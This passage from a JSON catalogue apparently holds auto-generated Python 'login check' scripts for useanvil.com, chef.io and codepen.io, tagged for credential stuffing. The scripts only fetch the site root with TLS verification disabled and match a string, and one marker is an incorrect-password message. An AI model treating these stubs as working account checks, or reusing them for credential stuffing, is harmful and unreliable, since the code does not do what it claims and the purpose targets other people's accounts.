\"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"email\":\", \"eid\":\"\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"email\":\", \"eid\":\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"useanvil.com Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_avnil_pdf_generator_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: avnil-pdf-generator-check\nName: useanvil.com Login Check\nSeverity: critical\nDescription: Checks for a valid avnil pdf generator account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_avnil_pdf_generator_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"avnil-pdf-generator-check\"\n    SEVERITY = \"critical\"\n    NAME = \"useanvil.com Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = '[AND] mot(s) \\'\"email\":\", \"eid\":\"\\' | status HTTP [200]'\n\n        # Simple word matcher simulation\n        matchers = ['\"email\":\", \"eid\":\"']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"useanvil.com Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_avnil_pdf_generator_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "avnil-pdf",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_chefio_login_check",
        "name": "Chef.io Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid chef.io account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'Location: https://api.chef.io/login-success' | status HTTP [302]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: chefio-login-check\nName: Chef.io Login Check\nSeverity: critical\nDescription: Checks for a valid chef.io account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_chefio_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"chefio-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Chef.io Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Location: https://api.chef.io/login-success' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['Location: https://api.chef.io/login-success']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Chef.io Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_chefio_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: chefio-login-check\nName: Chef.io Login Check\nSeverity: critical\nDescription: Checks for a valid chef.io account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_chefio_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"chefio-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"Chef.io Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'Location: https://api.chef.io/login-success' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['Location: https://api.chef.io/login-success']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"Chef.io Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_chefio_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "cve": [],
        "tags": [
          "cloud",
          "creds-stuffing",
          "login-check",
          "chefio",
          "vuln"
        ],
        "cvss_score": 10.0
      },
      {
        "id": "fn_nuclei_codepen_login_check",
        "name": "codepen.io Login Check",
        "language": "Python",
        "famille": "WebApp",
        "description": "Checks for a valid codepen account.",
        "severity": "critical",
        "detection": "[AND] mot(s) 'The username or password you entered is incorrect, please try again.' | status HTTP [302]",
        "parameters": [],
        "returns": {
          "datatype": "Finding",
          "description": "Résultat de la détection : matched (bool), extracted_values (list), severity, template_id"
        },
        "source": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: codepen-login-check\nName: codepen.io Login Check\nSeverity: critical\nDescription: Checks for a valid codepen account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_codepen_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"codepen-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"codepen.io Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'The username or password you entered is incorrect, please try again.' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['The username or password you entered is incorrect, please try again.']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        print(f\"[NO MATCH] {result['name']} on {result['target']}\")\n\n    def _on_error(self, error: Exception):\n        \"\"\"Handle error event.\"\"\"\n        print(f\"[ERROR] {error}\", file=sys.stderr)\n\n\ndef main():\n    \"\"\"CLI entry point.\"\"\"\n    import argparse\n    parser = argparse.ArgumentParser(description=\"codepen.io Login Check\")\n    parser.add_argument(\"target\", help=\"Target URL/hostname\")\n    parser.add_argument(\"--proxy\", help=\"Proxy URL\")\n    parser.add_argument(\"--timeout\", type=int, default=10)\n    args = parser.parse_args()\n\n    checker = NucleiCheck_codepen_login_check(\n        target=args.target,\n        proxy=args.proxy,\n        timeout=args.timeout\n    )\n    result = checker.run()\n\n    print(json.dumps(result, indent=2, ensure_ascii=False))\n    sys.exit(0 if result[\"matched\"] else 1)\n\n\nif __name__ == \"__main__\":\n    main()",
        "source_original": "#!/usr/bin/env python3\n# -*- coding: utf-8 -*-\n\"\"\"\nNuclei Template: codepen-login-check\nName: codepen.io Login Check\nSeverity: critical\nDescription: Checks for a valid codepen account.\nAuto-generated by NucleiForge\n\"\"\"\n\nimport sys\nimport re\nimport json\nimport urllib.parse\nimport urllib.request\nfrom typing import List, Dict, Any, Optional\n\nclass NucleiCheck_codepen_login_check:\n    \"\"\"Detection check generated from Nuclei template.\"\"\"\n\n    TEMPLATE_ID = \"codepen-login-check\"\n    SEVERITY = \"critical\"\n    NAME = \"codepen.io Login Check\"\n\n    def __init__(self, target: str, **kwargs):\n        self.target = target.rstrip('/')\n        self.protocol = \"http\"\n        self.timeout = kwargs.get('timeout', 10)\n        self.proxy = kwargs.get('proxy', None)\n        self.follow_redirects = kwargs.get('follow_redirects', True)\n\n    def run(self) -> Dict[str, Any]:\n        \"\"\"Execute the detection check.\"\"\"\n        result = {\n            \"template_id\": self.TEMPLATE_ID,\n            \"name\": self.NAME,\n            \"severity\": self.SEVERITY,\n            \"target\": self.target,\n            \"matched\": False,\n            \"extracted\": [],\n            \"error\": None\n        }\n\n        try:\n            url = self._build_url()\n            response = self._send_request(url)\n\n            if self._check_matchers(response):\n                result[\"matched\"] = True\n                result[\"extracted\"] = self._run_extractors(response)\n                self._on_match(result)\n            else:\n                self._on_no_match(result)\n\n        except Exception as e:\n            result[\"error\"] = str(e)\n            self._on_error(e)\n\n        return result\n\n    def _build_url(self) -> str:\n        \"\"\"Construct target URL.\"\"\"\n        path = \"/\"\n        # Replace Nuclei variables\n        path = path.replace(\"{BaseURL}\", self.target)\n        path = path.replace(\"{BasePath}\", \"/\")\n        path = path.replace(\"{RootURL}\", self.target)\n        path = path.replace(\"{Hostname}\", urllib.parse.urlparse(self.target).hostname or self.target)\n        path = path.replace(\"{Port}\", str(urllib.parse.urlparse(self.target).port or\n                                          (443 if self.protocol == \"https\" else 80)))\n        path = path.replace(\"{Path}\", \"/\")\n        path = path.replace(\"{Scheme}\", self.protocol)\n\n        # Random strings (simplified)\n        import random, string\n        path = re.sub(r'{randstr}', lambda m: ''.join(random.choices(string.ascii_lowercase, k=8)), path)\n        path = re.sub(r'{rand_int}', lambda m: str(random.randint(1000, 9999)), path)\n\n        return urllib.parse.urljoin(self.target, path)\n\n    def _send_request(self, url: str) -> Dict[str, Any]:\n        \"\"\"Send HTTP request and return response dict.\"\"\"\n        import urllib.request\n        import ssl\n\n        req = urllib.request.Request(url, method=\"GET\")\n\n        # Headers\n        headers = {}\n        for k, v in headers.items():\n            req.add_header(k, v)\n\n        # SSL context\n        ctx = ssl.create_default_context()\n        ctx.check_hostname = False\n        ctx.verify_mode = ssl.CERT_NONE\n\n        # Proxy\n        if self.proxy:\n            req.set_proxy(self.proxy, 'http')\n\n        # Body\n        body = None\n        if body:\n            req.data = body.encode('utf-8')\n            if 'Content-Type' not in headers:\n                req.add_header('Content-Type', 'application/x-www-form-urlencoded')\n\n        response = urllib.request.urlopen(req, timeout=self.timeout, context=ctx)\n\n        return {\n            \"status_code\": response.getcode(),\n            \"headers\": dict(response.headers),\n            \"body\": response.read().decode('utf-8', errors='replace'),\n            \"url\": response.geturl()\n        }\n\n    def _check_matchers(self, response: Dict) -> bool:\n        \"\"\"Check response against matchers.\"\"\"\n        body = response.get(\"body\", \"\")\n        headers = str(response.get(\"headers\", {}))\n        status = response.get(\"status_code\", 0)\n\n        # TODO: Implement specific matchers from template\n        # Current: basic string matching from detection summary\n        detection = \"[AND] mot(s) 'The username or password you entered is incorrect, please try again.' | status HTTP [302]\"\n\n        # Simple word matcher simulation\n        matchers = ['The username or password you entered is incorrect, please try again.']\n\n        for matcher in matchers:\n            if matcher.lower() in body.lower():\n                return True\n            if matcher.lower() in headers.lower():\n                return True\n\n        return False\n\n    def _run_extractors(self, response: Dict) -> List[str]:\n        \"\"\"Run extractors on response.\"\"\"\n        extracted = []\n        body = response.get(\"body\", \"\")\n\n        # Regex extractors (simplified)\n        # TODO: Parse actual regex patterns from template\n\n        return extracted\n\n    def _on_match(self, result: Dict):\n        \"\"\"Handle match event.\"\"\"\n        print(f\"[MATCH] {result['name']} on {result['target']}\")\n        print(f\"        Severity: {result['severity']}\")\n\n    def _on_no_match(self, result: Dict):\n        \"\"\"Handle no-match event.\"\"\"\n        